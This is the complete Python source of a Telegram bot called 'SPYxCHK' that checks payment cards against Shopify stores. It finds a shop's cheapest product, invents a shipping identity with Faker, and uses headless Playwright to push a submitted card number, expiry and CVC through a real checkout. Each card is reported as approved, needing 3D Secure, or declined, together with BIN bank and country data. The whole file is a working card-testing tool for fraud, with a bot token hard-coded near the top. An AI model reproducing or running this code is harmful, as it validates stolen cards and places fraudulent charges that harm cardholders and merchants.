import json
import logging
import time
from pathlib import Path
from telegram.ext import Updater, CommandHandler, ConversationHandler
from playwright.sync_api import sync_playwright, TimeoutError
from faker import Faker
import requests

TELEGRAM_TOKEN = '7495663085:AAH8Mr2aZK7DrS8DFHTxhKqN9uJU1DSNtd0'  # <-- Replace with your Telegram bot token!
USER_DATA_FILE = "user_data.json"
fake = Faker()

WAIT_SITE, WAIT_CHECK = range(2)

def load_user_data():
    if Path(USER_DATA_FILE).exists():
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

user_data = load_user_data()

def start(update, context):
    update.message.reply_text("Send /setsite <shopify-url> to begin (e.g. /setsite https://nexbelt.com)")
    return WAIT_SITE

def setsite(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    if len(context.args) != 1 or not context.args[0].startswith("http"):
        update.message.reply_text("❗ Usage: /setsite <shopify-url>")
        return WAIT_SITE
    site = context.args[0].strip().rstrip("/")
    msg, product, fake_ship = find_cheapest_and_fake(site)
    if not product:
        update.message.reply_text(f"❌ {msg}")
        return WAIT_SITE
    user_data[str(chat_id)] = {
        "site": site,
        "cheapest_product": product,
        "fake_shipping": fake_ship,
        "user": user
    }
    save_user_data(user_data)
    update.message.reply_text(
        f"✅ Site added!\nCheapest product: {product['title']} – ${product['price']}\n"
        f"Send /check <card|mm|yyyy|cvc> to test a card!"
    )
    return WAIT_CHECK

def check(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    udata = user_data.get(str(chat_id))
    if not udata:
        update.message.reply_text("❗ Please /setsite first.")
        return WAIT_SITE
    if len(context.args) != 1 or "|" not in context.args[0]:
        update.message.reply_text("Usage: /check <card|mm|yyyy|cvc>")
        return WAIT_CHECK
    try:
        cc, mm, yyyy, cvc = context.args[0].strip().split("|")
        start = time.time()
        status, response = run_shopify_checkout(
            udata['site'], udata['cheapest_product'], udata['fake_shipping'], cc, mm, yyyy, cvc
        )
        end = time.time()
        msg = build_reply(
            card=f"{cc}|{mm}|{yyyy}|{cvc}",
            price=str(udata['cheapest_product']['price']),
            status=status,
            response=response,
            t_taken=(end-start),
            user=user
        )
        update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        update.message.reply_text(f"❌ Error: {e}")
    return WAIT_CHECK

def cancel(update, context):
    update.message.reply_text('Cancelled.')
    return ConversationHandler.END

def find_cheapest_and_fake(shop_url):
    try:
        r = requests.get(f"{shop_url}/products.json", timeout=12)
        if r.status_code != 200:
            return "Shopify /products.json not found or not public.", None, None
        products = r.json().get("products", [])
        cheapest = None
        for prod in products:
            for variant in prod.get("variants", []):
                price = float(variant.get("price", "999999"))
                if not cheapest or price < cheapest["price"]:
                    cheapest = {
                        "handle": prod["handle"],
                        "variant_id": variant["id"],
                        "price": price,
                        "title": prod["title"]
                    }
        if not cheapest:
            return "No products found.", None, None
        fake_ship = {
            "name": fake.name(),
            "email": fake.email(),
            "address": fake.street_address(),
            "city": fake.city(),
            "zip": fake.zipcode(),
            "country": "US",
            "phone": fake.msisdn()
        }
        return "OK", cheapest, fake_ship
    except Exception as e:
        return f"Error finding product: {e}", None, None

def run_shopify_checkout(site, product, shipping, cc, mm, yyyy, cvc):
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            # Add to cart
            page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", timeout=20000)
            # Checkout
            page.goto(f"{site}/checkout", timeout=20000)
            page.wait_for_selector('input[name="checkout[email]"]', timeout=20000)
            page.fill('input[name="checkout[email]"]', shipping['email'])
            page.fill('input[name="checkout[shipping_address][first_name]"]', shipping['name'].split()[0])
            page.fill('input[name="checkout[shipping_address][last_name]"]', shipping['name'].split()[-1])
            page.fill('input[name="checkout[shipping_address][address1]"]', shipping['address'])
            page.fill('input[name="checkout[shipping_address][city]"]', shipping['city'])
            page.fill('input[name="checkout[shipping_address][zip]"]', shipping['zip'])
            page.fill('input[name="checkout[shipping_address][country]"]', shipping['country'])
            page.fill('input[name="checkout[shipping_address][phone]"]', shipping['phone'])
            page.click('button[type="submit"]')  # Continue to shipping

            page.wait_for_timeout(3000)
            page.click('button[type="submit"]')  # Continue to payment

            page.wait_for_selector('iframe', timeout=20000)
            card_fields = {
                "number": cc,
                "expiry": f"{mm}/{yyyy[-2:]}",
                "verification_value": cvc,
            }
            # Fill Stripe/Shopify card fields in iframes
            filled = 0
            for frame in page.frames:
                try:
                    if frame.url and "card-fields" in frame.url:
                        if frame.query_selector('input[name="number"]'):
                            frame.fill('input[name="number"]', card_fields["number"])
                            filled += 1
                        elif frame.query_selector('input[name="expiry"]'):
                            frame.fill('input[name="expiry"]', card_fields["expiry"])
                            filled += 1
                        elif frame.query_selector('input[name="verification_value"]'):
                            frame.fill('input[name="verification_value"]', card_fields["verification_value"])
                            filled += 1
                except Exception:
                    continue
            if filled < 3:
                browser.close()
                return "DECLINED", "Could not fill all card fields (selectors may differ per shop)."
            page.click('button[type="submit"]')  # Click pay
            page.wait_for_timeout(7000)
            url = page.url
            content = page.content()
            browser.close()
            if "thank_you" in url or "order-received" in url:
                return "APPROVED", "PAYMENT_SUCCESS"
            elif "3d_secure" in content or "authentication" in content or "otp" in content:
                return "3D", "3DS/OTP_REQUIRED"
            elif "card declined" in content or "card was declined" in content or "declined" in content.lower():
                return "DECLINED", "CARD_DECLINED"
            else:
                return "DECLINED", "Payment step complete. Manual check may be needed."
    except TimeoutError:
        return "DECLINED", "Timeout—possible anti-bot or slow site."
    except Exception as e:
        return "DECLINED", f"Automation error: {e}"

def bin_lookup(bin_number):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            brand = d.get("scheme", "UNKNOWN").upper()
            card_type = d.get("type", "UNKNOWN").upper()
            level = d.get("brand", "UNKNOWN").upper()
            bank = d.get("bank", {}).get("name", "UNKNOWN")
            country = d.get("country", {}).get("name", "UNKNOWN")
            emoji = d.get("country", {}).get("emoji", "🏳️")
            return brand, card_type, level, bank, country, emoji
    except Exception:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "🏳️"

def build_reply(card, price, status, response, t_taken, user, dev="bunny"):
    n, mm, yy, cvc = card.split("|")
    bin6 = n[:6]
    brand, card_type, level, bank, country, emoji = bin_lookup(bin6)
    if status == "APPROVED":
        stat_emoji = "✅"
        stat_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
    elif status == "3D":
        stat_emoji = "🟡"
        stat_text = "𝐂𝐡𝐞𝐜𝐤 𝟑𝐃/𝐎𝐓𝐏"
    else:
        stat_emoji = "❌"
        stat_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"

    return f"""┏━━━ 🔍 Shopify Charge ━━━┓
┃ [ﾒ] Card- <code>{card}</code>
┃ [ﾒ] Gateway- Shopify Normal|{price}$ 
┃ [ﾒ] Status- {stat_text} {stat_emoji}
┃ [ﾒ] Response- {response}
━━═━━═━━═━━═━━
┃ [ﾒ] Bin: {bin6}
┃ [ﾒ] Info- {brand} - {card_type} - {level} 💳
┃ [ﾒ] Bank- {bank} 🏦
┃ [ﾒ] Country- {country} - [{emoji}]
━━═━━═━━═━━═━━
┃ [ﾒ] T/t- {t_taken:.2f} s 💨
┃ [ﾒ] Checked By: {user}
━━═━━═━━═━━═━━
┃ [ㇺ] Dev ➺ {dev} 
┗━━━ 〄 SPYxCHK ━━━┛
"""

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            WAIT_SITE: [CommandHandler('setsite', setsite)],
            WAIT_CHECK: [CommandHandler('check', check)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    updater.dispatcher.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()
